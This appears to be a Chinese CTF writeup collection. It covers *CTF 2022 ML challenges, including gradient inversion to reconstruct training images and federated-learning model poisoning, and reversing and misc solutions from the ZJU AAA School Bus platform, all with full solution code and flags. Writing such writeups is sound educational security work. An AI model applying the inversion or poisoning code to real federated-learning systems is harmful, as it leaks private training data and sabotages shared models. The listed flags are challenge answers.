<code>Unpickler</code></p> <pre><code>import torch\nimport string\nfrom torch import nn\nimport pickle\nclass AliceNet1(nn.Module):\n    def forward(self, x):\n        return self.fc(x)\nclass Unpickler(pickle.Unpickler):\n    def __init__(self, file):\n        super().__init__(file)\n    def persistent_load(self, pid):\n        print(pid, pid[2])\n        return pid[1].from_file(f'data/{pid[2]}', False, pid[4])\nwith open('data.pkl', 'rb') as f:\n    p = Unpickler(f).load()\nprint(p)\n</code></pre> <p>\uff08\u8d5b\u540e\u770b\u5b98\u65b9 wp \u662f\u8bf4\u53ef\u4ee5\u76f4\u63a5\u7528 torch.load \u8f7d\u5165\u9644\u4ef6\u7684 zip\uff09</p> <p>0.weight \u77e9\u9635\u53ea\u6709 0 \u548c 1\uff0c\u6bd4\u8f83\u5947\u602a\uff0c\u5c06\u6bcf\u884c\u4e3a 1 \u7684\u503c\u63d0\u51fa</p> <pre><code>for i, w in enumerate(p.fc.state_dict()[\"0.weight\"]):\n    print(i, [j for j, x in enumerate(w) if x == 1.0])\n</code></pre> <p>\u5f97\u5230\u4e0b\u9762\u7ed3\u679c\uff0c\u6309\u7167 <code>flagset</code> \uff0c36\uff08*\uff09\u662f\u8d77\u70b9\uff0c46\uff08}\uff09\u662f\u7ec8\u70b9\uff0c\u8981\u627e\u5230\u957f\u5ea6\u4e3a 16 \u7684\u8def\u5f84\uff0c\u539f\u59cb\u77e9\u9635\u5c31\u662f\u6709\u5411\u56fe\u7684\u90bb\u63a5\u77e9\u9635</p> <pre><code>0 [2, 13, 29]\n1 [19]\n2 [5, 6, 8, 31]\n3 [2, 4, 7, 29, 41]\n4 [7, 29, 34, 41, 45]\n5 [2, 3, 6, 9, 31]\n6 [3]\n7 [8, 41, 42]\n8 [3, 44]\n9 [13, 14, 17, 31, 42, 43, 45]\n10 []\n11 [7, 9, 44]\n12 [3, 4, 6, 7, 14, 15, 29]\n13 [8, 14, 15]\n14 [2, 6, 17, 29, 41, 42]\n15 [4, 5, 8, 28, 41, 44]\n16 [3, 43, 44]\n17 [8, 41, 42]\n18 [27]\n19 [30]\n20 [35]\n21 [22]\n22 [27]\n23 [22]\n24 [46]\n25 [3, 5, 8, 29, 34, 43, 45]\n26 [33]\n27 [46]\n28 [9, 17, 43]\n29 [2, 4, 9, 31, 44]\n30 [20]\n31 [4, 42, 44, 45]\n32 [23]\n33 [1]\n34 [8, 15, 43, 44]\n35 [23]\n36 [37]\n37 [38]\n38 [39]\n39 [40]\n40 [0, 10, 11, 12, 16, 18, 21, 24, 25, 26, 32]\n41 [28, 31, 43]\n42 [2, 41]\n43 [3, 5, 13, 14, 29, 34]\n44 [8, 15, 29]\n45 [3, 4, 5, 41, 42]\n46 []\n</code></pre> <p>\u6b63\u5411\u6709\u73af\uff0c\u53cd\u5411\u641c</p> <p><pre><code>flagset = string.printable[0:36]+\"*CTF{ALIZE}\"\nm = p.fc.state_dict()[\"0.weight\"]\n\ndef search(prev, x, n):\n    if n == 16:\n        if x == 36:\n            ans = [x] + prev\n            print(''.join(flagset[i] for i in ans))\n        return\n    for y, yv in enumerate(m):\n        if yv[x] == 1.0:\n            search([x] + prev, y, n + 1)\n\nsearch([], 46, 1)\n</code></pre> flag: *CTF{qx1jukznmr}</p>"},{"location":"writeups/%2Actf2022/#alices-challenge","title":"Alice\u2019s challenge","text":"<p>\u6839\u636e\u68af\u5ea6\u548c\u6700\u7ec8\u6a21\u578b\u653b\u51fb\u51fa\u8bad\u7ec3\u56fe\u7247\uff0c\u8c03\u7528  JonasGeiping/breaching inverting gradients</p> <pre><code>import json\nimport torch\nimport numpy as np\nfrom torch import nn\nimport breaching\nimport matplotlib.pyplot as plt\n\n\nclass AliceNet2(nn.Module):\n    def __init__(self) -&gt; None:\n        super().__init__()\n        self.conv = nn.Sequential(\n            nn.Conv2d(3, 12, kernel_size=(5, 5), stride=(2, 2), padding=(2, 2)),\n            nn.Sigmoid(),\n            nn.Conv2d(12, 12, kernel_size=(5, 5), stride=(2, 2), padding=(2, 2)),\n            nn.Sigmoid(),\n            nn.Conv2d(12, 12, kernel_size=(5, 5), stride=(1, 1), padding=(2, 2)),\n            nn.Sigmoid(),\n            nn.Conv2d(12, 12, kernel_size=(5, 5), stride=(1, 1), padding=(2, 2)),\n            nn.Sigmoid(),\n        )\n        self.fc = nn.Sequential(\n            nn.Linear(in_features=768, out_features=200, bias=True)\n        )\n\n    def forward(self, x):\n        x1 = self.conv(x)\n        fc_input = x1.reshape(1,768)\n        x2 = self.fc(fc_input)\n        return x2\n\ndef distribute_payload(model,cfg_data):\n    \"\"\"Server payload to send to users. These are only references to simplfiy the simulation.\"\"\"\n    honest_model_parameters = [p for p in model.parameters()]  # do not send only the generators\n    honest_model_buffers = [b for b in model.buffers()]\n    return dict(parameters=honest_model_parameters, buffers=honest_model_buffers, metadata=cfg_data)\n\ndef plot(user_data, cfg,i, scale=False, print_labels=False):\n    \"\"\"Plot user data to output. Probably best called from a jupyter notebook.\"\"\"\n    dm = torch.as_tensor(cfg.mean, **setup)[None, :, None, None]\n    ds = torch.as_tensor(cfg.std, **setup)[None, :, None, None]\n    classes = cfg.classes\n\n    data = user_data[\"data\"].clone().detach()\n    labels = user_data[\"labels\"].clone().detach() if user_data[\"labels\"] is not None else None\n    if labels is None:\n        print_labels = False\n\n    if scale:\n        min_val, max_val = data.amin(dim=[2, 3], keepdim=True), data.amax(dim=[2, 3], keepdim=True)\n        # print(f'min_val: {min_val} | max_val: {max_val}')\n        data = (data - min_val) / (max_val - min_val)\n    else:\n        data.mul_(ds).add_(dm).clamp_(0, 1)\n    data = data.to(dtype=torch.float32)\n\n    if data.shape[0] == 1:\n        plt.figure(i)\n        plt.axis(\"off\")\n        plt.imshow(data[0].permute(1, 2, 0).cpu())\n        if print_labels:\n            plt.title(f\"Data with label {classes[labels]}\")\n    else:\n        grid_shape = int(torch.as_tensor(data.shape[0]).sqrt().ceil())\n        s = 24 if data.shape[3] &gt; 150 else 6\n        fig, axes = plt.subplots(grid_shape, grid_shape, figsize=(s, s))\n        label_classes = []\n        for i, (im, axis) in enumerate(zip(data, axes.flatten())):\n            axis.imshow(im.permute(1, 2, 0).cpu())\n            if labels is not None and print_labels:\n                label_classes.append(classes[labels[i]])\n            axis.axis(\"off\")\n        if print_labels:\n            print(label_classes)\n\n\nif __name__ == \"__main__\":\n    model = torch.load('Net.model', map_location='cpu')\n    device = torch.device('cpu')\n\n    cfg = breaching.get_attack_config(\"invertinggradients\", overrides=[])\n    cfg.optim.max_iterations = 200\n    print(cfg)\n    setup = dict(device=device, dtype=getattr(torch, cfg.impl.dtype))\n    loss_fn = nn.CrossEntropyLoss()\n    attacker = breaching.attacks.prepare_attack(model, loss_fn, cfg, setup)\n\n    _cfg = breaching.get_config(overrides=[])\n    _cfg.case.data.shape = (3, 32, 32)\n    print(_cfg.case.data)\n    server_payload = distribute_payload(model, _cfg.case.data)\n    print(len(server_payload))\n    grads = []\n    for i in range(25):\n        grads.append(torch.load(f'grad/{i}.tensor', map_location='cpu'))\n    data = []\n    for i in range(25):\n        print(i)\n        metadata = dict(\n            num_data_points=1,\n            labels=None,\n            local_hyperparams=None,\n        )\n        shared_grads = grads[i]\n        shared_user_data = dict(\n            gradients=shared_grads, buffers=None, metadata=metadata\n        )\n        reconstructed_user_data, stats = attacker.reconstruct(\n            [server_payload], [shared_user_data], {}, dryrun=False\n        )\n        data.append(reconstructed_user_data)\n\n    for i in range(len(data)):\n        plot(data[i], _cfg.case.data, i)\n</code></pre> <p>\u8dd1\u51fa 25 \u5f20\u56fe\u7247\u7136\u540e\u731c+\u62fc\u63a5\u51fa flag: *CTF{PZEXHBEARAK8MQT5NAliceE}</p> <p>\u770b\u5b98\u65b9 wp \u662f\u76f4\u63a5\u6539\u7684  mit-han-lab/dlg \u91cc\u7684\u4ee3\u7801\uff0c\u6548\u679c\u66f4\u6e05\u6670</p>"},{"location":"writeups/%2Actf2022/#babyfl","title":"babyFL","text":"<p>\u672c\u5730\u8bad\u7ec3 1 \u4e2a\u9519\u8bef\u6a21\u578b\u548c 20 \u4e2a\u6b63\u786e\u6a21\u578b\uff0c\u53cd\u6c42\u6743\u91cd\uff0c\u53ef\u4ee5\u505a\u51fa\u3002\u4f46\u8fd9\u6837\u505a\u8fdc\u7a0b\u6b63\u786e\u7387\u53ea\u6709 0.91\uff0c\u5c06\u9519\u8bef\u6a21\u578b\u53c2\u6570\u7ffb\u500d\u5219\u53ef\u8fbe\u5230\u8981\u6c42</p> <p><pre><code>def load_adv_data():\n    (x, y), (_, _) = mnist.load_data()\n    l = len(y)\n    for i in range(l):\n        y[i] = 9 - y[i]\n    x = x.reshape(-1, 28, 28, 1)\n    return x, y\n\ndef train_adv_model():\n    x, y = load_adv_data()\n    model = new_model()\n    model.fit(x, y, batch_size=64, epochs=10)\n    model.save(\"./model/adv\")\n\ntrain_adv_model()\n\ndef load_adv_parameters():\n    print('load parameter')\n    parameters = []\n    model = load_model(\"./model/adv\")\n    for i in range(8):\n        layer = []\n        temp = model.get_weights()\n        layer.append(temp[i])\n        parameters.append(layer)\n    return parameters\n\nadv_parameters = load_adv_parameters()\n\ndef unaggregation(parameters, adv_parameters):\n    weights = []\n    for layer, adv_layer in zip(parameters, adv_parameters):\n        sum = 0\n        l = len(layer)\n        for temp in layer:\n            sum = sum + temp\n\n        adv_sum = 0\n        l = len(adv_layer)\n        for temp in adv_layer:\n            adv_sum = adv_sum + temp\n        weights.append(adv_sum * participant_number * 2 - sum)\n    return weights\n\noutput = unaggregation(parameters, adv_parameters)\n\ndef write_output(f, out):\n    if (type(out) == list) or (type(out) != list and len(out.shape) &gt; 1):\n        for temp in out:\n            write_output(f, temp)\n    else:\n        l = len(out)\n        for i in range(l):\n            f.write(f'{out[i]}\\n')\n\nwith open('out.txt', 'w') as f:\n    write_output(f, output)\n</code></pre> \u7136\u540e\u8bfb\u53d6 out.txt \u7528 pwntools \u4f9d\u6b21\u8f93\u5165\u5373\u53ef\u62ff\u5230\u5b8c\u6210\u8981\u6c42\u62ff\u5230 flag: *CTF{ESfSQIuTXVgsgA15kb2LclgKI91Qz63bSd17RpU0}</p>"},{"location":"writeups/%2Actf2022/#overfit","title":"overfit","text":"<p>\u8fd9\u9898\u6ca1\u505a\u51fa\u6765\uff0c\u4f46\u662f\u662f\u9644\u4ef6\u95ee\u9898\uff0c\u51fa\u9898\u4eba\u4e0a\u4f20\u9644\u4ef6\u4e22\u5305\u4e86</p> <p>\u6839\u636e https://github.com/huggingface/transformers/blob/main/src/transformers/models/gpt2/tokenization_gpt2.py \u4e0b\u8f7d\u4e00\u4e0b\u7f3a\u5c11\u7684 vocab.json \u548c merges.txt\uff1a <pre><code>PRETRAINED_VOCAB_FILES_MAP = {\n    \"vocab_file\": {\n        \"gpt2\": \"https://huggingface.co/gpt2/resolve/main/vocab.json\",\n        \"gpt2-medium\": \"https://huggingface.co/gpt2-medium/resolve/main/vocab.json\",\n        \"gpt2-large\": \"https://huggingface.co/gpt2-large/resolve/main/vocab.json\",\n        \"gpt2-xl\": \"https://huggingface.co/gpt2-xl/resolve/main/vocab.json\",\n        \"distilgpt2\": \"https://huggingface.co/distilgpt2/resolve/main/vocab.json\",\n    },\n    \"merges_file\": {\n        \"gpt2\": \"https://huggingface.co/gpt2/resolve/main/merges.txt\",\n        \"gpt2-medium\": \"https://huggingface.co/gpt2-medium/resolve/main/merges.txt\",\n        \"gpt2-large\": \"https://huggingface.co/gpt2-large/resolve/main/merges.txt\",\n        \"gpt2-xl\": \"https://huggingface.co/gpt2-xl/resolve/main/merges.txt\",\n        \"distilgpt2\": \"https://huggingface.co/distilgpt2/resolve/main/merges.txt\",\n    },\n}\n</code></pre> \u7528\u6700\u5c0f\u7684 gpt2 \u5c31\u53ef\u4ee5</p> <p>\u8f7d\u5165\u4e00\u4e0b pretrained \u5206\u8bcd\u5668\u548c\u6a21\u578b\uff0c\u7136\u540e\u6839\u636e\u9898\u76ee\u540d overfit\uff0c\u8fc7\u62df\u5408\uff0c\u5582\u4e00\u4e0b <code>*CTF</code> \u5c31\u53ef\u4ee5\u5f97\u5230\u8f93\u51fa\u7684 flag</p> <pre><code>from transformers import GPT2Tokenizer, GPT2LMHeadModel\nimport torch\n\ntokenizer = GPT2Tokenizer.from_pretrained(\"./model\")\nmodel = GPT2LMHeadModel.from_pretrained(\"./model\")\n\ntext = '*CTF{'\nencoded_input = tokenizer(text, return_tensors='pt').input_ids\n\noutput = model.generate(inputs=encoded_input)\nprint(tokenizer.batch_decode(sequences=output))\n# ['*CTF{say_h31l0_2_p1m!} - {']\n</code></pre> <p>\u6216\u8005\u4f7f\u7528 aitextgen \u5305\uff0c\u4e0d\u9700\u8981\u8865 vocab.json \u548c merges.txt\uff0c\u76f4\u63a5\u5c31\u53ef\u4ee5\u8f7d\u5165\uff0c\u7136\u540e\u8f93\u51fa\u7ed3\u679c\uff1a <pre><code>from aitextgen import aitextgen\nprint(aitextgen(model_folder='./models').generate(n=1, prompt=\"*CTF\", max_length=100))\n</code></pre> flag: *CTF{say_h31l0_2_p1m!}</p>"},{"location":"writeups/AAA/","title":"AAA School Bus Writeups","text":"<p>Abstract</p> <p>ZJU AAA School Bus \u662f AAA \u6218\u961f\u9762\u5411\u961f\u5185\u4ee5\u53ca\u6d59\u5927\u6821\u5185\u7684 CTF \u9898\u76ee\u5e73\u53f0</p> <p>\u8fd9\u91cc\u662f\u6211\u7684\u4e00\u4e9b writeup\uff08\u6b63\u5728\u8865\u5145\u4e2d\uff09\uff0c\u4e3b\u8981\u662f misc \u7531\u4e8e\u6821\u5df4\u4e2d\u5199\u9053\uff1a</p> <p>\u5f3a\u70c8\u4e0d\u63a8\u8350\u516c\u5f00 writeup</p> <p>\u6240\u4ee5\u8fd9\u7bc7\u6587\u7ae0\u5728\u8fd9\u91cc\u52a0\u5bc6\u4e86</p> \u6309\u5206\u533a\u7d22\u5f15\u6309\u9898\u76ee\u7c7b\u578b\u7d22\u5f15 \u5206\u533a\u7d22\u5f15 welcome <ul> <li>CheckIn</li> <li>QR Code</li> <li>calculator</li> <li>Reverse1</li> <li>apk01 baby</li> <li>linkedlist</li> </ul> emoclew <ul> <li>apk02 \u5b88\u671b\u8d77\u6765</li> <li>what's in RAR</li> <li>Reverse2</li> <li>Reverse3</li> <li>\u9ad8\u5fb7\u65af\u76ae\u7279\u7684\u8eab\u4efd\u8bc1</li> <li>crack_zju_wlan</li> <li>chopchop</li> <li>Dangerous Env</li> <li>blockchain quiz1</li> <li>blockchain quiz2</li> <li>money</li> </ul> ACTF 2016 <ul> <li>songmingti</li> <li>easy reversing</li> <li>\u773c\u89c1\u4e3a\u865a</li> <li>miaomiaomiao</li> </ul> 201706 <ul> <li>Jail</li> <li>find the backdoor</li> <li>hegengming's secret</li> <li>JSLinux</li> </ul> ACTF 2019 <ul> <li>pysandbox</li> <li>blockchain basics</li> </ul> ACTF 2020 <ul> <li>hard gambler</li> </ul> \u7c7b\u578b\u7d22\u5f15 misc <ul> <li>CheckIn</li> <li>QR Code</li> <li>what's in RAR</li> <li>crack_zju_wlan</li> <li>chopchop</li> <li>Dangerous Env</li> <li>songmingti</li> <li>miaomiaomiao</li> <li>Jail</li> <li>find the backdoor</li> <li>hegengming's secret</li> <li>JSLinux</li> <li>pysandbox</li> </ul> ppc <ul> <li>calculator</li> <li>linkedlist</li> <li>\u9ad8\u5fb7\u65af\u76ae\u7279\u7684\u8eab\u4efd\u8bc1</li> </ul> blockchain <ul> <li>blockchain basics</li> <li>blockchain quiz1</li> <li>blockchain quiz2</li> <li>hard gambler</li> <li>money</li> </ul> reverse <ul> <li>Reverse1</li> <li>Reverse2</li> <li>Reverse3</li> <li>apk01 baby</li> <li>apk02 \u5b88\u671b\u8d77\u6765</li> <li>easy reversing</li> <li>\u773c\u89c1\u4e3a\u865a</li> </ul> <p>\u5f85\u8865 wp\uff1a</p> <ul> <li> SQL injection</li> <li> EasyWeb</li> <li> Reverse1</li> <li> git leak</li> <li> apk01 baby</li> <li> php include</li> <li> Simple RSA</li> <li> War of tomcat</li> <li> flag403</li> <li> apk02 \u5b88\u671b\u8d77\u6765</li> <li> Reverse2</li> <li> Shellcode</li> <li> Reverse3</li> <li> babyshiro</li> <li> encrypted aes service</li> <li> \u6bcf\u65e5\u5065\u5eb7\u6253\u5361</li> <li> easy reversing</li> <li> \u5927\u4e4c\u9f9f\u627e\u5988\u5988</li> <li> \u773c\u89c1\u4e3a\u865a</li> <li> blockchain quiz2</li> </ul> <p> </p>"},{"location":"writeups/AAA/#checkin","title":"CheckIn","text":"<p>flag: AAA{Welcome_to_School_Bus}</p>"},{"location":"writeups/AAA/#qr-code","title":"QR Code","text":"\u9898\u76ee <p>\u628a\u80cc\u666f\u6539\u4e3a\u9ed1\u8272\u4e0d\u96be\u53d1\u73b0\u53f3\u4e0a\u89d2\u6709\u4e00\u4e2a\u7f3a\u89d2\u7684\u4e8c\u7ef4\u7801\uff0c\u76f4\u63a5\u62fc\u8d34\u4e0a\u5c31\u53ef\u4ee5\u626b\u51fa\u6765</p> <p>flag: AAA{setsuna_b1Ch1_qq_qun_386796080}</p>"},{"location":"writeups/AAA/#calculator","title":"calculator","text":"<p>\u5728 10 \u79d2\u5185\u89e3\u51fa 10 \u9053\u8ba1\u7b97\u9898\uff0c\u76f4\u63a5 eval \u5c31\u53ef\u4ee5\uff1a <pre><code>from pwn import *\n\np = remote(\"10.214.160.13\", 11002)\n\nfor i in range(10):\n    if i == 0:\n        p.recvlines(7)\n    else:\n        p.recvlines(3)\n    a = p.recvuntil(b\"=\").decode(\"utf-8\")[:-2]\n    p.sendline(str(eval(a)).encode(\"utf-8\"))\n\np.interactive()\n</code></pre> flag: AAA{melody_loves_doing_calculus_qq_qun_386796080}</p>"},{"location":"writeups/AAA/#reverse1","title":"Reverse1","text":"<p>\u62d6\u5230 IDA \u91cc\u9006\u4e00\u4e0b\uff0c\u518d\u6539\u4e00\u6539\uff1a <pre><code>int main() {\n  int res[] = {77, 77, 77, 119, 106, 97, 117, 96, 83, 93, 93, 83, 125, 121, 98, 83, 63, 52, 58, 59, 53, 58, 60, 52, 60, 113};\n  printf(\"Please input flag: \");\n  scanf(\"%s\", &amp;flag);\n  for ( i = 0; i &lt; 26; ++i )\n  {\n    if ( (flag[i] ^ 0xC) != res[i] )\n    {\n      printf(\"Your flag is not right.\");\n      exit(0);\n    }\n  }\n  printf(\"You are right!\");\n  exit(0);\n}\n</code></pre> \u628a res \u91cc\u7684\u6bcf\u4e2a\u503c\u9010\u4e2a\u5f02\u6216 0xC \u7136\u540e\u901a\u8fc7 ascii \u8f6c\u4e3a\u5b57\u7b26\u5373\u53ef\u5f97\u5230 flag: AAA{fmyl_QQ_qun_386796080}</p>"},{"location":"writeups/AAA/#apk01-baby","title":"apk01 baby","text":"<p>\u8003\u5bdf apk \u9006\u5411\u57fa\u672c\u65b9\u6cd5\uff0c\u5148\u628a .apk \u6539\u4e3a .zip \u89e3\u538b\uff0c\u5f97\u5230 .dex \u6587\u4ef6</p> <p>\u7136\u540e\u4f7f\u7528 dex2jar \u5c06 .dex \u8f6c\u4e3a .jar \u6587\u4ef6</p> <p>\u6700\u540e\u7528 jd-gui \u6253\u5f00\u53cd\u7f16\u8bd1 .jar \u6587\u4ef6\uff0c\u770b\u5230 MainActivity.class \u4e2d\u7684 flag: AAA{LeadroyaL_qq_qun_386796080}</p>"},{"location":"writeups/AAA/#linkedlist","title":"linkedlist","text":"<p>\u5148\u7b97\u4e00\u4e2a md5\uff0c\u7136\u540e\u5f97\u5230\u9898\u76ee</p> \u9898\u76ee <pre><code>==================================================\nYou must be good at linked-list,\nbut how about \"memcache\"?\nSo... (I won't tell you \"nc\" is enough)\nLet's crack a linked-list on memcache! Ovo\n==================================================\nFor example:\n    start -&gt; 1 -&gt; 2 -&gt; flag\nYou should \"get start\", then \"get 1\", \"get 2\",\nfinally you will get the flag~\n==================================================\nPlease Connect this memcached sever:\n               10.214.160.13:port\n***Attention***:\nThis memcache server will be removed after 5 minutes\nHURRY UP! LEARN MEMCACHE!\n</code></pre> <p>\u5927\u6982\u610f\u601d\u662f\u4f1a\u5f00\u4e00\u4e2a memcache \u7684 server\uff0c\u7136\u540e get\uff0c\u5f97\u5230\u7684\u5185\u5bb9\u518d get\uff0c\u76f4\u5230 get \u8fd4\u56de flag</p> <p>5 \u5206\u949f\uff0c\u65f6\u95f4\u5145\u8db3\uff0c\u76f4\u63a5\u5728\u7ec8\u7aef\u5199\u5c31\u597d\u4e86\uff1a <pre><code>&gt;&gt;&gt; import memcache\n&gt;&gt;&gt; mc = memcache.Client([\"10.214.160.13:49155\"])\n&gt;&gt;&gt; res = \"start\"\n&gt;&gt;&gt; while True:\n...     res = mc.get(res).decode(\"utf-8\")\n...     if res.startswith(\"AAA\"):\n...         print(res)\n...         break\n...\nAAA{MemCache_1s_S0_eaSy_qq_qun_386796080}\n</code></pre> flag: AAA{MemCache_1s_S0_eaSy_qq_qun_386796080}</p>"},{"location":"writeups/AAA/#apk02","title":"apk02 \u5b88\u671b\u8d77\u6765","text":"<p>\u9006\u4e00\u4e0b\u770b MainActivity\uff0c\u662f\u5c06\u8f93\u5165\u7684\u6570\u5b57\u6bcf\u4e24\u4e2a\u6570\u5b57\u4e00\u7ec4\u4f5c\u4e3a\u4e00\u4e2a\u5341\u8fdb\u5236\u6570\uff0c\u7136\u540e\u4f5c\u4e3a\u7d22\u5f15\u53bb\u4e00\u4e2a\u5217\u8868\u4e2d\u5f97\u5230\u4e00\u4e2a\u5b57\u7b26\uff0c\u5206\u522b\u62fc\u8d77\u6765\uff0c\u5f62\u6210 \u201c\u938f\u91d1\u54c7\u5361\u5440\u5e93\u5217\u201d \u5373\u6b63\u786e</p> <p>\u5176\u4e2d\u5217\u8868\u4e2d\u6709\u4e00\u4e9b\u503c\u662f\u8d1f\u7684\uff0c\u800c Java \u4e2d char \u7c7b\u578b\u4e3a\u65e0\u7b26\u53f7\uff0c\u8303\u56f4 0\uff5e65535\uff0c\u6240\u4ee5\u8d1f\u7684\u76f4\u63a5\u52a0 65536 \u7136\u540e\u8f6c\u4e3a char</p> <p>\u628a \u201c\u938f\u91d1\u54c7\u5361\u5440\u5e93\u5217\u201d \u5206\u522b\u4ece\u5217\u8868\u4e2d\u627e\u5230\u7d22\u5f15\uff0c\u5f97\u5230 flag: AAA{12345386796080}</p>"},{"location":"writeups/AAA/#whats-in-rar","title":"what's in RAR","text":"<p>\u7ed9\u4e86\u4e00\u4e2a rar \u538b\u7f29\u5305\uff0c\u9996\u5148\u7206\u7834\u5bc6\u7801 \u5df2\u77e5\u5bc6\u7801\u5728 123456 \u9644\u8fd1\uff0c\u7206\u7834\u53ef\u5f97\u5bc6\u7801\u4e3a 123465</p> <p>\u7136\u540e\u4f7f\u7528 WinRAR \u89e3\u538b\uff08\u4f1a\u6bd4 7zip \u591a\u4e00\u4e2a droste.zip \u538b\u7f29\u5305\uff0c\u5e76\u4e14\u8fd9\u4e2a\u538b\u7f29\u5305\u89e3\u538b\u540e\u8fd8\u4f1a\u5f97\u5230\u540c\u6837\u7684\u7ed3\u679c\uff09 \u6839\u636e hint \u77e5\u9053\u662f NTFS \u6587\u4ef6\u6d41</p> <p>\u7136\u540e\u4f7f\u7528 NtfsStreamsEditor \u5de5\u5177\u68c0\u6d4b\uff1a  \u63d0\u53d6\uff1a  \u6240\u4ee5 flag: AAA{NTFS_flow_is_interesting_qq_qun_386796080}</p>"},{"location":"writeups/AAA/#reverse2","title":"Reverse2","text":"<p>\u5e26 GUI \u7684 rev\uff0c\u8fd9\u9898\u53ef\u80fd\u662f\u975e\u9884\u671f\u4e86\uff1f</p> <p>\u76f4\u63a5 IDA \u6253\u5f00\u53ef\u4ee5\u641c\u7d22\u5230 .rdata \u6bb5\u4e2d\u76f4\u63a5\u5b58\u50a8\u4e86 flag: AAA{zhe_shi_fulaige_heng!_qq_qun386796080}</p>"},{"location":"writeups/AAA/#reverse3","title":"Reverse3","text":"<p>C# \u9006\u5411\uff0c\u901a\u8fc7 ILSpy \u9006\u5411\u5f97\u5230\u6e90\u7801</p> <p>\u53ef\u4ee5\u770b\u5230\u91cc\u9762\u5b9e\u73b0\u4e86\u77e9\u9635\u3001\u65b9\u9635\u7684\u4e00\u4e9b\u529f\u80fd</p> <p>\u5e76\u4e14\u5bf9\u4e8e flag \u7684\u68c0\u67e5\u5206\u4e3a\u4e24\u4e2a\u90e8\u5206\uff0c\u540e\u4e00\u534a\u7ecf\u8fc7\u4e00\u7cfb\u5217\u5f02\u6216\u8fd0\u7b97\u540e\u53ef\u4ee5\u63a8\u5f97 <code>_QQ_Qun_386796080}</code></p> <p>\u524d\u4e00\u534a\u7684\u903b\u8f91\u662f\uff1a <pre><code>for (int k = 0; k &lt; 14; k++)\n{\n    if (text[k + 4] &gt; '\\u007f')\n    {\n        throw new Exception(\"\u4e0d\u5bf9\u554a\uff01\");\n    }\n    array2[k, 0] = text[k + 4];\n}\nMatrix matrix = new Matrix(array2);\nif (GetSquare() * matrix != new Matrix(new int[14, 1]\n{\n    { 45 }, { 77 }, { 7 }, { 109 }, { 112 }, { 98 }, { 11 }, { 14 }, { 70 }, { 77 }, { 16 }, { 26 }, { 1 }, { 106 }\n}))\n{\n    throw new Exception(\"\u4e0d\u5bf9\u554a\uff01\");\n}\nConsole.WriteLine(\"\u606d\u559c\u4f60\uff0c\u7b54\u6848\u6b63\u786e\uff01\");\n</code></pre> \u4e5f\u5c31\u662f\u751f\u6210\u4e00\u4e2a\u65b9\u9635\uff0c\u70b9\u4e58 flag \u4e2d { \u540e\u9762 14 \u4e2a\u5b57\u7b26\uff0c\u5982\u679c\u7b49\u4e8e\u8fd9\u4e2a\u5217\u5411\u91cf\uff0c\u5219\u6b63\u786e</p> <p>\u800c\u751f\u6210\u65b9\u9635\u7684\u65b9\u6cd5\uff1a <pre><code>private static Square GetSquare()\n{\n    MemoryStream memoryStream = new MemoryStream();\n    BinaryFormatter binaryFormatter = new BinaryFormatter();\n    string graph = \"\u5973\u513f\u60b2\uff0c\u9752\u6625\u5df2\u5927\u5b88\u7a7a\u95fa\u3002\\n\u5973\u513f\u6101\uff0c\u6094\u6559\u592b\u5a7f\u89c5\u5c01\u4faf\u3002\\n\u5973\u513f\u559c\uff0c\u5bf9\u955c\u6668\u5986\u989c\u8272\u7f8e\u3002\\n\u5973\u513f\u4e50\uff0c\u79cb\u5343\u67b6\u4e0a\u6625\u886b\u8584\u3002\\n\\t\u2014\u2014\u300a\u7ea2\u697c\u68a6\u300b\";\n    binaryFormatter.Serialize(memoryStream, graph);\n    byte[] array = memoryStream.ToArray();\n    Square square = new Square(14);\n    for (int i = 0; i &lt; square.Dimension; i++)\n    {\n        for (int j = 0; j &lt; square.Dimension; j++)\n        {\n            square.SetValue(i + 1, j + 1, (int)array[7 * (i + j * 14) % 195] % 127);\n        }\n    }\n    memoryStream.Close();\n    return square;\n}\n</code></pre> \u662f\u5bf9\u4e00\u4e2a\u5b57\u7b26\u4e32\u8fdb\u884c\u5e8f\u5217\u5316\u5b9e\u73b0\u7684\uff0c\u548c\u8f93\u5165\u6ca1\u5173\uff0c\u53ef\u4ee5\u76f4\u63a5\u590d\u5236\u5230\u65b0\u7684 C# \u4ee3\u7801\u4e2d\u8dd1\u51fa\u6765</p> <p>\u6c42\u89e3\u5462\uff0c\u56e0\u4e3a\u4ee3\u7801\u4e2d\u5df2\u7ecf\u63d0\u4f9b\u4e86\u9ad8\u65af\u6d88\u5143\u6cd5\uff0c\u76f4\u63a5\u5957\u7528\u6c42\u89e3\u5373\u53ef\uff1a</p> Done <pre><code>static void Main(string[] args) {\n    string graph = \"\u5973\u513f\u60b2\uff0c\u9752\u6625\u5df2\u5927\u5b88\u7a7a\u95fa\u3002\\n\u5973\u513f\u6101\uff0c\u6094\u6559\u592b\u5a7f\u89c5\u5c01\u4faf\u3002\\n\u5973\u513f\u559c\uff0c\u5bf9\u955c\u6668\u5986\u989c\u8272\u7f8e\u3002\\n\u5973\u513f\u4e50\uff0c\u79cb\u5343\u67b6\u4e0a\u6625\u886b\u8584\u3002\\n\\t\u2014\u2014\u300a\u7ea2\u697c\u68a6\u300b\";\n    MemoryStream memoryStream = new MemoryStream();\n    BinaryFormatter bf = new BinaryFormatter();\n    bf.Serialize(memoryStream, graph);\n    byte[] array = memoryStream.ToArray();\n    Square square = new Square(14);\n    for (int i = 0; i &lt; square.Dimension; i++)\n    {\n        for (int j = 0; j &lt; square.Dimension; j++)\n        {\n            square.SetValue(i + 1, j + 1, (int)array[7 * (i + j * 14) % 195] % 127);\n        }\n    }\n    memoryStream.Close();\n    Matrix res = new Matrix(new int[14, 1]\n    {\n        { 45 },\n        { 77 },\n        { 7 },\n        { 109 },\n        { 112 },\n        { 98 },\n        { 11 },\n        { 14 },\n        { 70 },\n        { 77 },\n        { 16 },\n        { 26 },\n        { 1 },\n        { 106 }\n    });\n    Matrix t = square.Gauss(res);\n    for (int i = 1; i &lt;= t.RowNum; i++)\n    {\n        Console.Write((char)t.GetValue(i, 1));\n    }\n}\n</code></pre> <p>\u7f16\u8bd1\u8fd0\u884c\u5f97\u5230\u524d\u534a\u6bb5\uff0c\u62fc\u63a5\u8d77\u6765\u5c31\u662f flag: AAA{C#_Is_The_Best_QQ_Qun_386796080}</p>"},{"location":"writeups/AAA/#_1","title":"\u9ad8\u5fb7\u65af\u76ae\u7279\u7684\u8eab\u4efd\u8bc1","text":"\u9898\u76ee <p>\u543e\u6709\u4e00\u53cb\uff0c\u6765\u81ea\u672a\u6765\u3002</p> 